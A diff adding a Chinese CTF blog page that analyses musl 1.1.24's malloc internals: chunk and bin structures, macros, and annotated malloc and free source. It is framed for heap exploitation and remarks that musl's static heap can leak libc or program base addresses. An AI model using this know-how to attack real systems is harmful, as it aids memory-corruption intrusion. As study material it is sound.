@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Note," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01.基础结构和定义musl1.1.24 malloc基础定义在malloc_impl.h文件中。 堆块基本结构。psize是前一个堆块的size，csize是当前堆块的size，通过next，prev把堆块用双向链表链接。不同于glibc，psize一直有效。1234struct chunk &amp;#123;	size_t psize, csize;	struct chunk *next, *p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="musl1.1.24源码分析+利用">
+<meta property="og:url" content="http://example.com/2021/12/09/musl1-1-24%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Tm0tfl">
+<meta property="og:description" content="0x01.基础结构和定义musl1.1.24 malloc基础定义在malloc_impl.h文件中。 堆块基本结构。psize是前一个堆块的size，csize是当前堆块的size，通过next，prev把堆块用双向链表链接。不同于glibc，psize一直有效。1234struct chunk &amp;#123;	size_t psize, csize;	struct chunk *next, *p">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208171035885.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211209160637275.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208203841534.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208193732141.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208194141064.png">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208195510399.png">
+<meta property="article:published_time" content="2021-12-09T08:37:06.000Z">
+<meta property="article:modified_time" content="2021-12-09T08:39:22.974Z">
+<meta property="article:author" content="Tm0tfl">
+<meta property="article:tag" content="Note">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208171035885.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/12/09/musl1-1-24源码分析-利用/"/>
+
+
+
+
+
+  <title>musl1.1.24源码分析+利用 | Tm0tfl</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tm0tfl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/09/musl1-1-24%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tm0tfl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">musl1.1.24源码分析+利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-09T16:37:06+08:00">
+                2021-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/Note/" itemprop="url" rel="index">
+                    <span itemprop="name">Note</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x01-基础结构和定义"><a href="#0x01-基础结构和定义" class="headerlink" title="0x01.基础结构和定义"></a>0x01.基础结构和定义</h1><p>musl1.1.24 malloc基础定义在malloc_impl.h文件中。</p>
+<p>堆块基本结构。psize是前一个堆块的size，csize是当前堆块的size，通过next，prev把堆块用双向链表链接。不同于glibc，psize一直有效。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> psize, csize;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>bin的基本结构，head指针指向bin中第一个堆块，tail指针指向最后一个堆块，第一个堆块的prev指向bin，最后一个堆块的next也指向bin。当head=next==0，或者是head=next\==&amp;bin的时候说明bin为空。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">//链表头，用来链接空闲堆块</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>mal的结构，类似glibc中的arena<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="comment">//binmap用来表示对应bin是否为空</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap;</span><br><span class="line">    <span class="comment">//bin的数组</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure><br>一些宏定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4size_t对齐,64位是0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_ALIGN (4*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_MASK (-SIZE_ALIGN)</span></span><br><span class="line"><span class="comment">//chunk头部大小为2*size_t，64位是0x10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OVERHEAD (2*sizeof(size_t))</span></span><br><span class="line"><span class="comment">//获得堆块的csize和psize，去除标志位的影响</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE(c) ((c)-&gt;csize &amp; -2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_PSIZE(c) ((c)-&gt;psize &amp; -2)</span></span><br><span class="line"><span class="comment">//获得物理上前一个堆块和后一个堆块，csize定位nextchunk，psize定位prevchunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_CHUNK(c) ((struct chunk *)((char *)(c) - CHUNK_PSIZE(c)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_CHUNK(c) ((struct chunk *)((char *)(c) + CHUNK_SIZE(c)))</span></span><br><span class="line"><span class="comment">//mem是指向存放内容位置，chunk是指向head</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEM_TO_CHUNK(p) (struct chunk *)((char *)(p) - OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_TO_MEM(c) (void *)((char *)(c) + OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIN_TO_CHUNK(i) (MEM_TO_CHUNK(&amp;mal.bins[i].head))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//标志位inuse，如果设置了inuse说明堆块正在使用，否则说明堆块已经被释放或者通过mmap释放需要通过psize进一步判断</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> C_INUSE  ((size_t)1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br></pre></td></tr></table></figure><br>musl中堆块的大小,0-31是每个bin对应一个大小，后面是对应多个大小</p>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211208171035885.png" alt="image-20211208171035885"></p>
+<p><strong>musl存在特殊的静态堆内存区</strong>，在glibc中，堆从一开始就动态申请和释放，而在musl中，程序开始的时候musl会把程序和libc空闲的区域当做堆内存（静态内存），优先从这里面划分空间，这部分空间用完之后再通过mmap进行分配。</p>
+<p>这个性质可以用来泄露libc地址或者是程序基址。</p>
+<h1 id="0x02-malloc"><a href="#0x02-malloc" class="headerlink" title="0x02.malloc"></a>0x02.malloc</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断n是否符合条件，并且转化为0x20对齐</span></span><br><span class="line">	<span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//n大于0x1c00*SIZE_ALIGN，采用mmap直接分配</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (base == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		c = (<span class="keyword">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">		<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//获得对应bin的索引</span></span><br><span class="line">	i = bin_index_up(n);</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="comment">//找到所有大于等于i的bin,小于i的bin会被去除</span></span><br><span class="line">		<span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        <span class="comment">//如果没有合适的bin，通过扩展堆进行分配</span></span><br><span class="line">		<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">			c = expand_heap(n);</span><br><span class="line">			<span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">				c = PREV_CHUNK(c);</span><br><span class="line">				NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">					x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//找到符合条件最小的bin</span></span><br><span class="line">        <span class="comment">//内嵌汇编指令bsf,找到值为1的最低的位</span></span><br><span class="line">		j = first_set(mask); </span><br><span class="line">		lock_bin(j);</span><br><span class="line">		c = mal.bins[j].head;</span><br><span class="line">        <span class="comment">//判断头结点的head指针是不是指向自己,指向自己的话说明bin为空</span></span><br><span class="line">		<span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;</span><br><span class="line">			<span class="comment">//分割堆块</span></span><br><span class="line">			<span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);<span class="comment">//从bin中去除,堆块先进先出</span></span><br><span class="line">			unlock_bin(j);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_bin(j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    <span class="comment">//回收切割剩余的堆块</span></span><br><span class="line">	trim(c, n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>流程如下：</p>
+<ul>
+<li>先对size进行对齐操作,0x20对齐</li>
+<li>如果size大于MMAP_THRESHOLD,则由mmap进行分配</li>
+<li>如果size小于MMAP_ThRESHOLD,则尝试从bin中分配<ul>
+<li>如果没有合适的bin,扩展堆空间进行分配</li>
+<li>找到最适合的bin,取出堆块进行分割,并把堆块从对应bin删除</li>
+<li>最后回收剩余堆块</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x03-free"><a href="#0x03-free" class="headerlink" title="0x03.free"></a>0x03.free</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果通过mmap分配的，调用unmap,inuse位=0</span></span><br><span class="line">	<span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">		unmap_chunk(self);</span><br><span class="line">	<span class="comment">//否则调用__bin_chunk</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		__bin_chunk(self);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unmap_chunk</span><span class="params">(struct chunk *self)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> extra = self-&gt;psize;</span><br><span class="line">	<span class="keyword">char</span> *base = (<span class="keyword">char</span> *)self - extra;</span><br><span class="line">	<span class="keyword">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">	<span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="comment">//检测double free</span></span><br><span class="line">	<span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">	__munmap(base, len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __bin_chunk(struct chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">	<span class="keyword">size_t</span> final_size, new_size, size;</span><br><span class="line">	<span class="keyword">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//finalsize为合并空闲块之后的size</span></span><br><span class="line">	final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">	<span class="comment">//检测nextchunk的psize和chunk的size是否相等</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//前后堆块的inuse都为1,没法合并</span></span><br><span class="line">		<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">			self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">			next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">			i = bin_index(final_size);</span><br><span class="line">			lock_bin(i);</span><br><span class="line">			lock(mal.free_lock);</span><br><span class="line">			<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			unlock(mal.free_lock);</span><br><span class="line">			unlock_bin(i);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//向前合并</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">			self = PREV_CHUNK(self);</span><br><span class="line">			size = CHUNK_SIZE(self);</span><br><span class="line">            <span class="comment">//更新size</span></span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//向后合并</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">			size = CHUNK_SIZE(next);</span><br><span class="line">            <span class="comment">//更新size</span></span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//更新next指针</span></span><br><span class="line">			next = NEXT_CHUNK(next);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">		a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">	<span class="comment">//更新self-&gt;csize,next-&gt;psize</span></span><br><span class="line">	self-&gt;csize = final_size;</span><br><span class="line">	next-&gt;psize = final_size;</span><br><span class="line">	unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//放在对应bin的双向链表的最后</span></span><br><span class="line">	self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">	self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">	self-&gt;next-&gt;prev = self;</span><br><span class="line">	self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">	<span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">		<span class="keyword">uintptr_t</span> a = (<span class="keyword">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">uintptr_t</span> b = (<span class="keyword">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1</span></span><br><span class="line">		__madvise((<span class="keyword">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">		__mmap((<span class="keyword">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>判断ISUSE位是否为0,如果为0说明chunk是通过mmap申请或者已经释放<ul>
+<li>通过unmap_chunk</li>
+</ul>
+</li>
+<li>ISUSE位为1,通过__bin_chunk()进行释放<ul>
+<li>查看前后堆块是否处于释放状态，如果处于则尝试向前向后合并</li>
+<li>将合并后的堆块放进对应bin中</li>
+</ul>
+</li>
+</ul>
